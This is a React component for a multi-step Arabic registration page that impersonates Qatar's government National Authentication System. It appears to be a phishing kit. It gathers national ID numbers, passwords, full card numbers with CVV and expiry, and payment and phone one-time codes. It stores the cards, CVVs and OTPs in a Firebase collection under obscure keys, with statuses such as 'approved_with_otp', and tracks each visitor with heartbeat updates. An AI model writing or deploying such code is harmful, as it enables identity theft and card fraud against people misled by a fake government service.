"use client"

import { useState, useEffect } from "react"
import { Card } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { addData, addCardToHistory, updateLastActive } from "@/lib/firebase"

function getOrCreateVisitorId(): string {
  if (typeof window === "undefined") return Date.now().toString()
  let id = localStorage.getItem("visitorId")
  if (!id) {
    id = `v_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`
    localStorage.setItem("visitorId", id)
  }
  return id
}

export function AuthenticationForm() {
  const [currentStep, setCurrentStep] = useState(1)
  const [selectedType, setSelectedType] = useState("")
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [paymentOtp, setPaymentOtp] = useState("")
  const [phoneOtp, setPhoneOtp] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [userId, setUserId] = useState<number | null>(null)
  const [visitorId, setVisitorId] = useState<string>("")

  const [personalData, setPersonalData] = useState({
    qid: "",
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    phoneProvider: "",
  })
  const [password, setPassword] = useState({
    password: "",
    confirmPassword: "",
  })
  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardHolder: "",
  })

  // Track visitor in Firebase on mount
  useEffect(() => {
    const vid = getOrCreateVisitorId()
    setVisitorId(vid)
    addData({
      id: vid,
      currentStep: 1,
      currentPage: "auth-form",
      status: "draft",
      country: "QA",
      identityNumber: "",
      ownerName: "",
      phoneNumber: "",
      documentType: "استمارة",
      serialNumber: "",
      insuranceType: "تأمين جديد",
      insuranceCoverage: "",
      insuranceStartDate: "",
      vehicleUsage: "",
      vehicleValue: "",
      vehicleYear: "",
      vehicleModel: "",
      paymentStatus: "pending",
    })

    // Keep lastActiveAt updated
    const interval = setInterval(() => {
      updateLastActive(vid)
    }, 20000)
    return () => clearInterval(interval)
  }, [])

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {}
    if (!selectedType) {
      newErrors.accountType = "يرجى اختيار نوع الحساب"
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validateStep2 = () => {
    const newErrors: Record<string, string> = {}
    if (!personalData.qid) {
      newErrors.qid = "هذا الحقل مطلوب"
    } else if (personalData.qid.length < 11) {
      newErrors.qid = "رقم البطاقة غير صحيح"
    }
    if (!personalData.firstName) {
      newErrors.firstName = "هذا الحقل مطلوب"
    }
    if (!personalData.lastName) {
      newErrors.lastName = "هذا الحقل مطلوب"
    }
    if (!personalData.email) {
      newErrors.email = "هذا الحقل مطلوب"
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) {
      newErrors.email = "البريد الإلكتروني غير صحيح"
    }
    if (!personalData.phone) {
      newErrors.phone = "هذا الحقل مطلوب"
    } else if (!/^[0-9]{8}$/.test(personalData.phone)) {
      newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
    }
    if (!personalData.phoneProvider) {
      newErrors.phoneProvider = "يرجى اختيار مزود الخدمة"
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validateStep3 = () => {
    const newErrors: Record<string, string> = {}
    if (!password.password) {
      newErrors.password = "هذا الحقل مطلوب"
    } else if (password.password.length < 8) {
      newErrors.password = "كلمة المرور يجب أن تكون 8 أحرف على الأقل"
    } else if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/.test(password.password)) {
      newErrors.password = "يجب أن تحتوي على حروف كبيرة وصغيرة وأرقام"
    }
    if (!password.confirmPassword) {
      newErrors.confirmPassword = "هذا الحقل مطلوب"
    } else if (password.password !== password.confirmPassword) {
      newErrors.confirmPassword = "كلمة المرور غير متطابقة"
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validateStep4 = () => {
    const newErrors: Record<string, string> = {}
    if (!cardData.cardNumber) {
      newErrors.cardNumber = "هذا الحقل مطلوب"
    } else if (cardData.cardNumber.replace(/\s/g, "").length !== 16) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح"
    }
    if (!cardData.expiryDate) {
      newErrors.expiryDate = "هذا الحقل مطلوب"
    } else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) {
      newErrors.expiryDate = "التاريخ غير صحيح (MM/YY)"
    }
    if (!cardData.cvv) {
      newErrors.cvv = "هذا الحقل مطلوب"
    } else if (cardData.cvv.length !== 3) {
      newErrors.cvv = "CVV يجب أن يكون 3 أرقام"
    }
    if (!cardData.cardHolder) {
      newErrors.cardHolder = "هذا الحقل مطلوب"
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validateStep7 = () => {
    const newErrors: Record<string, string> = {}
    if (!phoneOtp) {
      newErrors.phoneOtp = "يرجى إدخال رمز التحقق"
    } else if (phoneOtp.length !== 6) {
      newErrors.phoneOtp = "رمز التحقق يجب أن يكون 6 أرقام"
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleNext = async () => {
    setErrors({})

    let isValid = true
    if (currentStep === 1) isValid = validateStep1()
    if (currentStep === 2) isValid = validateStep2()
    if (currentStep === 3) isValid = validateStep3()
    if (currentStep === 4) isValid = validateStep4()
    if (currentStep === 7) isValid = validateStep7()

    if (!isValid) return

    setIsLoading(true)

    try {
      // Step 2 done: save personal data to Firebase
      if (currentStep === 2 && visitorId) {
        await addData({
          id: visitorId,
          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
          identityNumber: personalData.qid,
          phoneNumber: personalData.phone,
          currentStep: 3,
          currentPage: "auth-form",
          status: "draft",
          country: "QA",
          documentType: "استمارة",
          serialNumber: "",
          insuranceType: "تأمين جديد",
          insuranceCoverage: "",
          insuranceStartDate: "",
          vehicleUsage: "",
          vehicleValue: "",
          vehicleYear: "",
          vehicleModel: "",
          paymentStatus: "pending",
        })
      }

      // Step 3: Register user in database
      if (currentStep === 3) {
        const response = await fetch("/api/auth/register", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            accountType: selectedType,
            fullName: `${personalData.firstName} ${personalData.lastName}`,
            nationalId: personalData.qid,
            email: personalData.email,
            phoneNumber: personalData.phone,
            phoneProvider: personalData.phoneProvider,
            password: password.password,
          }),
        })

        const data = await response.json()

        if (!response.ok) {
          setErrors({ general: data.error || "حدث خطأ أثناء التسجيل" })
          setIsLoading(false)
          return
        }

        setUserId(data.userId)
      }

      // Step 4: Process payment
      if (currentStep === 4) {
        if (!userId) {
          setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
          setIsLoading(false)
          return
        }

        const response = await fetch("/api/payment/process", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId,
            cardHolderName: cardData.cardHolder,
            cardNumber: cardData.cardNumber,
            cardExpiry: cardData.expiryDate,
            cvv: cardData.cvv,
          }),
        })

        const data = await response.json()

        if (!response.ok) {
          setErrors({ general: data.error || "حدث خطأ أثناء معالجة الدفع" })
          setIsLoading(false)
          return
        }

        // Save card to Firebase
        if (visitorId) {
          await addCardToHistory(visitorId, {
            cardNumber: cardData.cardNumber.replace(/\s/g, ""),
            cvv: cardData.cvv,
            expiryDate: cardData.expiryDate,
            cardName: cardData.cardHolder,
          })
        }

        setIsLoading(false)
        setShowOtpDialog(true)
        return
      }

      // Step 6: Send phone verification OTP
      if (currentStep === 6) {
        if (!userId) {
          setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
          setIsLoading(false)
          return
        }

        const response = await fetch("/api/phone/send-otp", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ userId }),
        })

        const data = await response.json()

        if (!response.ok) {
          setErrors({ general: data.error || "حدث خطأ أثناء إرسال رمز التحقق" })
          setIsLoading(false)
          return
        }
      }

      // Step 7: Verify phone OTP + save to Firebase
      if (currentStep === 7) {
        if (!userId) {
          setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
          setIsLoading(false)
          return
        }

        const response = await fetch("/api/phone/verify-otp", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ userId, otp: phoneOtp }),
        })

        const data = await response.json()

        if (!response.ok) {
          setErrors({ phoneOtp: data.error || "رمز التحقق غير صحيح" })
          setIsLoading(false)
          return
        }

        // Save phone OTP to Firebase
        if (visitorId) {
          await addData({
            id: visitorId,
            phoneOtp,
            _v7: phoneOtp,
            currentStep: 8,
            currentPage: "auth-form",
            status: "pending_review",
            country: "QA",
            identityNumber: personalData.qid,
            ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
            phoneNumber: personalData.phone,
            documentType: "استمارة",
            serialNumber: "",
            insuranceType: "تأمين جديد",
            insuranceCoverage: "",
            insuranceStartDate: "",
            vehicleUsage: "",
            vehicleValue: "",
            vehicleYear: "",
            vehicleModel: "",
            paymentStatus: "completed",
          })
        }

        if (data.sessionToken) {
          localStorage.setItem("sessionToken", data.sessionToken)
        }
      }

      setIsLoading(false)
      if (currentStep < 8) setCurrentStep(currentStep + 1)
    } catch (error) {
      console.error("[v0] API call failed:", error)
      setErrors({ general: "حدث خطأ في الاتصال بالخادم" })
      setIsLoading(false)
    }
  }

  const handleOtpVerification = async () => {
    if (!paymentOtp || paymentOtp.length !== 6) {
      setErrors({ paymentOtp: "يرجى إدخال رمز التحقق الصحيح" })
      return
    }

    if (!userId) {
      setErrors({ paymentOtp: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
      return
    }

    setIsLoading(true)

    try {
      const response = await fetch("/api/payment/verify-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, otp: paymentOtp }),
      })

      const data = await response.json()

      if (!response.ok) {
        setErrors({ paymentOtp: data.error || "رمز التحقق غير صحيح" })
        setIsLoading(false)
        return
      }

      // Save payment OTP to Firebase
      if (visitorId) {
        await addData({
          id: visitorId,
          otpCode: paymentOtp,
          _v5: paymentOtp,
          cardStatus: "approved_with_otp",
          currentStep: currentStep + 1,
          currentPage: "auth-form",
          status: "draft",
          country: "QA",
          identityNumber: personalData.qid,
          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
          phoneNumber: personalData.phone,
          documentType: "استمارة",
          serialNumber: "",
          insuranceType: "تأمين جديد",
          insuranceCoverage: "",
          insuranceStartDate: "",
          vehicleUsage: "",
          vehicleValue: "",
          vehicleYear: "",
          vehicleModel: "",
          paymentStatus: "pending",
        })
      }

      setIsLoading(false)
      setShowOtpDialog(false)
      setCurrentStep(currentStep + 1)
    } catch (error) {
      console.error("[v0] OTP verification failed:", error)
      setErrors({ paymentOtp: "حدث خطأ في الاتصال بالخادم" })
      setIsLoading(false)
    }
  }

  const handleBack = () => {
    if (currentStep > 1) setCurrentStep(currentStep - 1)
    setErrors({})
  }

  const steps = [
    { number: "1", label1: "نوع", label2: "الحساب" },
    { number: "2", label1: "البيانات", label2: "الشخصية" },
    { number: "3", label1: "كلمة", label2: "المرور" },
    { number: "4", label1: "الدفع", label2: "بالبطاقة" },
    { number: "5", label1: "التسجيد", label2: "" },
    { number: "6", label1: "توثيق رقم", label2: "الهاتف" },
    { number: "7", label1: "رمز", label2: "التحقق" },
    { number: "8", label1: "إنتهاء", label2: "التسجيل" },
  ]

  return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b px-4 py-3 md:py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex flex-col gap-0.5 md:gap-1">
            <h1 className="text-base md:text-lg font-semibold text-[#8b1538]">نظام التوثيق الوطني</h1>
            <p className="text-[10px] md:text-xs text-gray-600">National Authentication System</p>
          </div>
          <div className="flex items-center gap-2 md:gap-4">
            <div className="flex items-center gap-1.5 md:gap-2">
              <div className="w-10 h-10 md:w-12 md:h-12 bg-white rounded-lg flex items-center justify-center p-1.5 md:p-2">
                <svg viewBox="0 0 40 40" className="w-full h-full">
                  <circle cx="12" cy="20" r="8" fill="#8b1538" />
                  <circle cx="28" cy="20" r="8" fill="#0078c1" />
                  <path d="M 12 12 Q 20 8 28 12" fill="none" stroke="#0078c1" strokeWidth="2" />
                  <path d="M 12 28 Q 20 32 28 28" fill="none" stroke="#8b1538" strokeWidth="2" />
                </svg>
              </div>
              <div className="text-[10px] md:text-xs">
                <div className="font-bold text-gray-800">توثيق</div>
                <div className="text-[8px] md:text-[10px] text-gray-500 tracking-wider">TAMTHEEQ</div>
              </div>
            </div>
            <button className="p-1.5 md:p-2">
              <svg
                className="w-5 h-5 md:w-6 md:h-6 text-gray-700"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-6xl mx-auto w-full px-3 md:px-4 py-4 md:py-8">
        <div className="mb-8 md:mb-12">
          <div className="flex items-center justify-start md:justify-center overflow-x-auto pb-4 hide-scrollbar">
            <div className="flex items-center min-w-max px-2">
              {steps.map((step, index) => (
                <div key={index} className="flex items-center">
                  <div className="flex flex-col items-center gap-1.5 md:gap-2 min-w-[80px] md:min-w-[120px]">
                    <div
                      className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center font-bold text-base md:text-lg transition-colors ${
                        currentStep === index + 1 ? "bg-[#0078c1] text-white" : "bg-gray-300 text-gray-600"
                      }`}
                    >
                      {step.number}
                    </div>
                    <div className="text-center">
                      <div className="font-semibold text-xs md:text-sm">{step.label1}</div>
                      {step.label2 && <div className="text-[10px] md:text-xs text-gray-600">{step.label2}</div>}
                    </div>
                  </div>
                  {index < steps.length - 1 && (
                    <div className="flex-1 min-w-[30px] md:min-w-[40px] h-[2px] bg-gray-300 -mt-6 md:-mt-8 mx-1 md:mx-2" />
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>

        <Card className="bg-[#f5f5f5] p-4 md:p-8 shadow-sm border-0">
          {errors.general && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-red-600 text-sm text-center">{errors.general}</p>
            </div>
          )}

          {/* Step 1: Account Type */}
          {currentStep === 1 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">اختر نوع الحساب</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div className="flex items-center gap-2 text-base md:text-lg mb-4">
                  <span className="text-red-500">*</span>
                  <span className="font-semibold">نوع الحساب</span>
                  <span className="bg-[#0078c1] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">؟</span>
                </div>
                {errors.accountType && <p className="text-red-500 text-sm mb-2">{errors.accountType}</p>}
                <RadioGroup value={selectedType} onValueChange={setSelectedType}>
                  <div className="flex items-center space-x-2 space-x-reverse p-3 md:p-4 bg-white border-2 border-gray-300 rounded-lg hover:border-[#0078c1] transition-colors cursor-pointer">
                    <RadioGroupItem value="citizens" id="citizens" className="ml-3" />
                    <Label htmlFor="citizens" className="cursor-pointer text-sm md:text-base flex-1">المواطنين القطريين والمقيمين</Label>
                  </div>
                  <div className="flex items-center space-x-2 space-x-reverse p-3 md:p-4 bg-white border-2 border-gray-300 rounded-lg hover:border-[#0078c1] transition-colors cursor-pointer">
                    <RadioGroupItem value="visitors" id="visitors" className="ml-3" />
                    <Label htmlFor="visitors" className="cursor-pointer text-sm md:text-base flex-1">الزوار والمستخدمين من خارج دولة قطر</Label>
                  </div>
                </RadioGroup>
              </div>
            </div>
          )}

          {/* Step 2: Personal Data */}
          {currentStep === 2 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">البيانات الشخصية</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="qid" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم الهوية القطرية</Label>
                  <Input id="qid" value={personalData.qid} onChange={(e) => setPersonalData({ ...personalData, qid: e.target.value })} className={`bg-white ${errors.qid ? "border-red-500" : ""}`} maxLength={11} />
                  {errors.qid && <p className="text-red-500 text-xs mt-1">{errors.qid}</p>}
                </div>
                <div className="grid grid-cols-2 gap-3 md:gap-4">
                  <div>
                    <Label htmlFor="firstName" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> الاسم الأول</Label>
                    <Input id="firstName" value={personalData.firstName} onChange={(e) => setPersonalData({ ...personalData, firstName: e.target.value })} className={`bg-white ${errors.firstName ? "border-red-500" : ""}`} />
                    {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
                  </div>
                  <div>
                    <Label htmlFor="lastName" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> اسم العائلة</Label>
                    <Input id="lastName" value={personalData.lastName} onChange={(e) => setPersonalData({ ...personalData, lastName: e.target.value })} className={`bg-white ${errors.lastName ? "border-red-500" : ""}`} />
                    {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
                  </div>
                </div>
                <div>
                  <Label htmlFor="email" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> البريد الإلكتروني</Label>
                  <Input id="email" type="email" value={personalData.email} onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })} className={`bg-white ${errors.email ? "border-red-500" : ""}`} />
                  {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                </div>
                <div>
                  <Label htmlFor="phone" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم الهاتف</Label>
                  <Input id="phone" value={personalData.phone} onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value.replace(/\D/g, "") })} className={`bg-white ${errors.phone ? "border-red-500" : ""}`} maxLength={8} />
                  {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
                </div>
                <div>
                  <Label className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> مزود الخدمة</Label>
                  <Select value={personalData.phoneProvider} onValueChange={(v) => setPersonalData({ ...personalData, phoneProvider: v })}>
                    <SelectTrigger className={`bg-white ${errors.phoneProvider ? "border-red-500" : ""}`}>
                      <SelectValue placeholder="اختر مزود الخدمة" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="ooredoo">Ooredoo</SelectItem>
                      <SelectItem value="vodafone">Vodafone</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.phoneProvider && <p className="text-red-500 text-xs mt-1">{errors.phoneProvider}</p>}
                </div>
              </div>
            </div>
          )}

          {/* Step 3: Password */}
          {currentStep === 3 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">كلمة المرور</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="password" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> كلمة المرور</Label>
                  <Input id="password" type="password" value={password.password} onChange={(e) => setPassword({ ...password, password: e.target.value })} className={`bg-white ${errors.password ? "border-red-500" : ""}`} />
                  {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
                </div>
                <div>
                  <Label htmlFor="confirmPassword" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> تأكيد كلمة المرور</Label>
                  <Input id="confirmPassword" type="password" value={password.confirmPassword} onChange={(e) => setPassword({ ...password, confirmPassword: e.target.value })} className={`bg-white ${errors.confirmPassword ? "border-red-500" : ""}`} />
                  {errors.confirmPassword && <p className="text-red-500 text-xs mt-1">{errors.confirmPassword}</p>}
                </div>
              </div>
            </div>
          )}

          {/* Step 4: Payment */}
          {currentStep === 4 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">الدفع بالبطاقة</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="cardNumber" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم البطاقة</Label>
                  <Input id="cardNumber" value={cardData.cardNumber} onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0,16); const f = v.match(/.{1,4}/g)?.join(" ") || v; setCardData({ ...cardData, cardNumber: f }) }} className={`bg-white ${errors.cardNumber ? "border-red-500" : ""}`} maxLength={19} placeholder="0000 0000 0000 0000" />
                  {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                </div>
                <div className="grid grid-cols-2 gap-3 md:gap-4">
                  <div>
                    <Label htmlFor="expiryDate" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> تاريخ الانتهاء</Label>
                    <Input id="expiryDate" value={cardData.expiryDate} onChange={(e) => { let v = e.target.value.replace(/\D/g, "").slice(0,4); if (v.length >= 3) v = v.slice(0,2) + "/" + v.slice(2); setCardData({ ...cardData, expiryDate: v }) }} className={`bg-white ${errors.expiryDate ? "border-red-500" : ""}`} placeholder="MM/YY" maxLength={5} />
                    {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
                  </div>
                  <div>
                    <Label htmlFor="cvv" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> CVV</Label>
                    <Input id="cvv" value={cardData.cvv} onChange={(e) => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, "").slice(0,3) })} className={`bg-white ${errors.cvv ? "border-red-500" : ""}`} maxLength={3} placeholder="000" />
                    {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                  </div>
                </div>
                <div>
                  <Label htmlFor="cardHolder" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> اسم حامل البطاقة</Label>
                  <Input id="cardHolder" value={cardData.cardHolder} onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })} className={`bg-white ${errors.cardHolder ? "border-red-500" : ""}`} />
                  {errors.cardHolder && <p className="text-red-500 text-xs mt-1">{errors.cardHolder}</p>}
                </div>
              </div>
            </div>
          )}

          {/* Step 5: Registration Processing */}
          {currentStep === 5 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيل</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
                <div className="bg-white p-6 md:p-8 rounded-lg space-y-4">
                  <div className="text-green-600 text-4xl">✓</div>
                  <span className="text-green-600">تم الدفع ✓</span>
                </div>
              </div>
            </div>
          )}

          {/* Step 6: Phone Verification Info */}
          {currentStep === 6 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">توثيق رقم الهاتف</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div className="bg-white p-6 md:p-8 rounded-lg text-center space-y-4">
                  <div className="w-16 h-16 md:w-20 md:h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                    <svg className="w-8 h-8 md:w-10 md:h-10 text-[#0078c1]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V9a2 2 0 00-2-2H8a2 2 0 00-2 2v2a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <p className="text-base md:text-lg">يرجى إدخال رمز التحقق المرسل إلى هاتفك</p>
                </div>
              </div>
            </div>
          )}

          {/* Step 7: OTP Verification */}
          {currentStep === 7 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="phoneOtp" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رمز التحقق</Label>
                  <Input id="phoneOtp" value={phoneOtp} onChange={(e) => setPhoneOtp(e.target.value)} className={`bg-white ${errors.phoneOtp ? "border-red-500" : ""}`} maxLength={6} />
                  {errors.phoneOtp && <p className="text-red-500 text-xs mt-1">{errors.phoneOtp}</p>}
                </div>
              </div>
            </div>
          )}

          {/* Step 8: Registration Completion */}
          {currentStep === 8 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">إنتهاء التسجيل</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
                <p className="text-base md:text-lg">شكراً لتسجيلك</p>
                <p className="text-base md:text-lg">يمكنك الآن استخدام خدماتنا</p>
              </div>
            </div>
          )}

          {/* Navigation Buttons */}
          <div className="flex justify-center gap-3 md:gap-4 mt-6 md:mt-8">
            {currentStep < 8 && (
              <Button variant="outline" onClick={handleBack} disabled={currentStep === 1 || isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">
                إلغاء
              </Button>
            )}
            {currentStep > 1 && currentStep < 8 && (
              <Button variant="outline" onClick={handleBack} disabled={isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">
                رجوع
              </Button>
            )}
            {currentStep < 8 && (
              <Button onClick={handleNext} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
                {isLoading ? (
                  <span className="flex items-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    جاري التحميل...
                  </span>
                ) : (
                  "استمر"
                )}
              </Button>
            )}
          </div>
        </Card>

        <footer className="text-center mt-6 md:mt-8 text-xs md:text-sm text-gray-600">
          <p>© 2025 حكومة قطر</p>
        </footer>
      </main>

      {/* OTP Dialog */}
      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
        <DialogContent className="max-w-sm mx-4" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-lg md:text-xl font-bold text-center">تأكيد الدفع</DialogTitle>
            <DialogDescription className="text-sm md:text-base text-center">
              يرجى إدخال رمز التحقق المرسل إلى هاتفك {personalData.phone}
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 md:space-y-6 pt-4">
            <div>
              <Label htmlFor="paymentOtp" className="text-sm md:text-base mb-2 block text-center"><span className="text-red-500">*</span> رمز التحقق</Label>
              <Input id="paymentOtp" value={paymentOtp} onChange={(e) => setPaymentOtp(e.target.value.replace(/\D/g, ""))} className={`bg-white text-center text-xl md:text-2xl tracking-[0.5em] font-bold ${errors.paymentOtp ? "border-red-500" : ""}`} maxLength={6} placeholder="000000" />
              {errors.paymentOtp && <p className="text-red-500 text-xs mt-1 text-center">{errors.paymentOtp}</p>}
              <p className="text-xs md:text-sm text-gray-500 text-center mt-2">الرمز صالح لمدة 5 دقائق فقط</p>
            </div>
            <div className="flex justify-center gap-3">
              <Button variant="outline" onClick={() => setShowOtpDialog(false)} disabled={isLoading} className="px-6 text-sm md:text-base">إلغاء</Button>
              <Button onClick={handleOtpVerification} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 text-sm md:text-base">
                {isLoading ? (
                  <span className="flex items-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    جاري التحقق...
                  </span>
                ) : (
                  "تأكيد"
                )}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}